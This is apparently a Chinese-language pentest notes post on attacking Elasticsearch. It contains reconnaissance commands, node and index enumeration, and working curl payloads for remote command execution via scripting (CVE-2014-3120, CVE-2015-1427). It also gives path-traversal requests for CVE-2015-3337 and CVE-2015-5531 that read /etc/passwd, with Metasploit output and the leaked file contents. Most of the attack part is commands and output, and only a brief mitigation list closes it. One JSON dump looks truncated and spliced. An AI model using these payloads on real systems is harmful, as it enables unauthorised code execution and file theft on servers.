---
title: Elasticsearch
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2021-01-06 17:50:11
top:
tags:
layout:
---
编写进度
- [x] 


`Elasticsearch`是一个使用java开发的基于Lucene库的开源的高扩展的分布式全文搜索引擎。
它可以近乎实时存储、检索数据,具有HTTP Web接口和无模式JSON文档。

默认端口：
- `9200` http端口
- `9300` 数据传输端口
- `组播端口(UDP)` 54328

[Elasticsearch API](https://www.elastic.co/guide/en/elasticsearch/reference/current/rest-apis.html)

# Infomation
CURL
```zsh
curl http://10.200.88.6:9201 ｜ grep "You Know, for Search"
```

Nmap
```zsh
 nmap -Pn -T4  -sV -p 9201  10.200.88.6

Nmap scan report for 10.200.88.6
Host is up (0.059s latency).

PORT     STATE SERVICE VERSION
9200/tcp open  http    Elasticsearch REST API 5.6.10 (name: 10.200.88.6; cluster: mscp-elasticsearch; Lucene 6.6.1)

Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds
```
# 漏洞利用
[cat API](https://www.elastic.co/guide/en/elasticsearch/reference/current/cat.html)

```zsh
GET /_cat/nodes?h=ip,port,heapPercent,name
```


```zsh
curl http://10.200.88.6:9201/_cat  # 查看cat的功能 

/_cat/nodes
/_cat/tasks
/_cat/indices
/_cat/indices/{index}

curl "http://10.200.88.6:9201/_cat/indices?v"                  

health status index                uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   onc_v1_lb-2020-12-17 Ik3EFySWRyC2Nufv99iYpA   3   1       2304            0    713.1kb        356.7kb
green  open   onc_v1_lb-2021-01-02 ewkYI6EuR--3PtesQsfZag   3   1       2304            0    724.1kb        362.1kb
green  open   test                 gQHpUySfQaep7vfWs0zJzg   3   1          2            0     13.9kb          6.9kb


curl http://10.200.88.6:9201/_nodes  # 查看节点数据

{"_nodes":{"total":3,"successful":3,"failed":0},"cluster_name":"mscp-elasticsearch","nodes":{"-6isCA5RTaeItZlabhGf6A":{"name":"10.200.88.8","transport_address":"10.200.88.8:9301","host":"10.200.88.8","ip":"10.200.88.8","version":"5.6.10","build_hash":"b727a60","total_indexing_buffer":830360780,"roles":["master","data","ingest"],"attributes":{"ml.max_open_jobs":"10","ml.enabled":"true"},"settings":{"cluster":{"name":"mscp-elasticsearch"}{"type":"set"},{"type":"set_security_user"},{"type":"sort"},{"type":"split"},{"type":"trim"},{"type":"uppercase"},{"type":"user_agent"}]}

```
## EXP

### 创建一条测试数据

该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据

```zsh
curl -X POST "http://10.200.88.6:9201/website/blog"  -d '{"name":"test"}'

{"_index":"website","_type":"blog","_id":"AXbXVwBUIRRtVWWNffFo","_version":1,"result":"created","_shards":{"total":2,"successful":2,"failed":0},"created":true}
```


```zsh
curl -X POST "http://10.200.88.6:9201/_search?pretty"  -d '{"size":1, "script_fields": {"lupin":{"script": "1+665"}}}' -v

{
  "took" : 5,
  "timed_out" : false,
  "_shards" : {
    "total" : 102,
    "successful" : 102,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : 68637,
    "max_score" : 1.0,
    "hits" : [
      {
        "_index" : "onc_v1_lb-2020-12-08",
        "_type" : "vperf",
        "_id" : "AXY97qwJP4DeVVFFFPWX",
        "_score" : 1.0,
        "fields" : {
          "lupin" : [
            666
          ]
        }
      }
    ]
  }
}
```

### ElasticSearch 命令执行漏洞CVE-2014-3120
```zsh
curl -X POST "http://10.200.88.6:9201/_search?pretty"  -d '{                                              
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }    },
    "script_fields": {
        "command": {            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}'

```

### ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞CVE-2015-1427
```zsh
curl -X POST "http://10.200.88.6:9201/_search?pretty"  -d '{                                         
   "size":1,
   "script_fields":{
      "lupin":{
         "lang":"groovy",
         "script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
      }
   }
}'
```

### ElasticSearch 目录穿越漏洞CVE-2015-3337
```zsh
curl -X GET "http://10.200.88.6:9201/_plugin/head/../../../../../../../../../etc/passwd"  -v
```

### ElasticSearch 目录穿越漏洞CVE-2015-5531

#### MSF模块利用
```zsh
Module options (auxiliary/scanner/http/elasticsearch_traversal):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DEPTH     7                yes       Traversal depth
   FILEPATH  /etc/passwd      yes       The path to the file to read
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    192.168.108.223  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     9200             yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   THREADS   1                yes       The number of concurrent threads (max one per host)
   VHOST                      no        HTTP server virtual host

192.168.108.223:default auxiliary(scanner/http/elasticsearch_traversal) > run

[*] The target appears to be vulnerable.
[+] File saved in: /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

192.168.108.223:default auxiliary(scanner/http/elasticsearch_traversal) > cat /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txt
[*] exec: cat /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txt

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
```

#### curl利用
1. 新建一个仓库
```zsh
curl -X POST "http://192.168.79.28:9200/_snapshot/test" -d '{                                        
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test" 
    }
}'
{"acknowledged":true}
```

2. 创建一个快照
```zsh
curl -X POST "http://192.168.79.28:9200/_snapshot/test2" -d '{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata" 
    }
}'
{"acknowledged":true}
```
3. 目录穿越读取任意文件

[POC
](https://www.exploit-db.com/exploits/38383/)
```zsh
curl -X GET "http://192.168.79.28:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpa
sswd" 

{"error":"ElasticsearchParseException[Failed to derive xcontent from (offset=0, length=919): [114, 111, 111, 1
16, 58, 120, 58, 48, 58, 48, 58, 114, 111, 111, 116, 58, 47, 114, 111, 111, 116, 58, 47, 98, 105, 110, 47, 98,
 97, 115, 104, 10, 100, 97, 101, 109, 111, 110, 58, 120, 58, 49, 58, 49, 58, 100, 97, 101, 109, 111, 110, 58, 
47, 117, 115, 114, 47, 115, 98, 105, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111
, 103, 105, 110, 10, 98, 105, 110, 58, 120, 58, 50, 58, 50, 58, 98, 105, 110, 58, 47, 98, 105, 110, 58, 47, 11
7, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 115, 121, 115, 58, 120, 58, 51,
 58, 51, 58, 115, 121, 115, 58, 47, 100, 101, 118, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111,
 108, 111, 103, 105, 110, 10, 115, 121, 110, 99, 58, 120, 58, 52, 58, 54, 53, 53, 51, 52, 58, 115, 121, 110, 9
9, 58, 47, 98, 105, 110, 58, 47, 98, 105, 110, 47, 115, 121, 110, 99, 10, 103, 97, 109, 101, 115, 58, 120, 58,
 53, 58, 54, 48, 58, 103, 97, 109, 101, 115, 58, 47, 117, 115, 114, 47, 103, 97, 109, 101, 115, 58, 47, 117, 1
15, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 109, 97, 110, 58, 120, 58, 54, 58, 
49, 50, 58, 109, 97, 110, 58, 47, 118, 97, 114, 47, 99, 97, 99, 104, 101, 47, 109, 97, 110, 58, 47, 117, 115, 
114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 108, 112, 58, 120, 58, 55, 58, 55, 58, 
108, 112, 58, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 108, 112, 100, 58, 47, 117, 115, 114, 47, 115
, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 109, 97, 105, 108, 58, 120, 58, 56, 58, 56, 58, 109
, 97, 105, 108, 58, 47, 118, 97, 114, 47, 109, 97, 105, 108, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47,
 110, 111, 108, 111, 103, 105, 110, 10, 110, 101, 119, 115, 58, 120, 58, 57, 58, 57, 58, 110, 101, 119, 115, 5
8, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 110, 101, 119, 115, 58, 47, 117, 115, 114, 47, 115, 98, 
105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 117, 117, 99, 112, 58, 120, 58, 49, 48, 58, 49, 48, 58, 1
17, 117, 99, 112, 58, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 117, 117, 99, 112, 58, 47, 117, 115, 
114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 112, 114, 111, 120, 121, 58, 120, 58, 4
9, 51, 58, 49, 51, 58, 112, 114, 111, 120, 121, 58, 47, 98, 105, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105,
 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 119, 119, 119, 45, 100, 97, 116, 97, 58, 120, 58, 51, 51, 58,
 51, 51, 58, 119, 119, 119, 45, 100, 97, 116, 97, 58, 47, 118, 97, 114, 47, 119, 119, 119, 58, 47, 117, 115, 1
14, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 98, 97, 99, 107, 117, 112, 58, 120, 58, 
51, 52, 58, 51, 52, 58, 98, 97, 99, 107, 117, 112, 58, 47, 118, 97, 114, 47, 98, 97, 99, 107, 117, 112, 115, 5
8, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 108, 105, 115, 116, 58, 120, 58, 51, 56, 58, 51, 56, 58, 77, 97, 105, 108, 105, 110, 103, 32, 76, 105, 115, 116, 32, 77, 97, 110, 97, 103, 101, 114, 58, 47, 118, 97, 114, 47, 108, 105, 115, 116, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 105, 114, 99, 58, 120, 58, 51, 57, 58, 51, 57, 58, 105, 114, 99, 100, 58, 47, 118, 97, 114, 47, 114, 117, 110, 47, 105, 114, 99, 100, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 103, 110, 97, 116, 115, 58, 120, 58, 52, 49, 58, 52, 49, 58, 71, 110, 97, 116, 115, 32, 66, 117, 103, 45, 82, 101, 112, 111, 114, 116, 105, 110, 103, 32, 83, 121, 115, 116, 101, 109, 32, 40, 97, 100, 109, 105, 110, 41, 58, 47, 118, 97, 114, 47, 108, 105, 98, 47, 103, 110, 97, 116, 115, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 110, 111, 98, 111, 100, 121, 58, 120, 58, 54, 53, 53, 51, 52, 58, 54, 53, 53, 51, 52, 58, 110, 111, 98, 111, 100, 121, 58, 47, 110, 111, 110, 101, 120, 105, 115, 116, 101, 110, 116, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 95, 97, 112, 116, 58, 120, 58, 49, 48, 48, 58, 54, 53, 53, 51, 52, 58, 58, 47, 110, 111, 110, 101, 120, 105, 115, 116, 101, 110, 116, 58, 47, 98, 105, 110, 47, 102, 97, 108, 115, 101, 10]]","status":400}
```
对十进制整数进行解码即可
[解码平台](https://tool.leavesongs.com/)


## Solution

1. 限制IP访问，绑定固定IP
2. 在config/elasticsearch.yml中为9200端口设置认证：
```zsh
　　http.basic.enabled true #开关，开启会接管全部HTTP连接
　　http.basic.user "admin" #账号
　　http.basic.password "admin_pw" #密码
　　http.basic.ipwhitelist ["localhost", "127.0.0.1"]
```





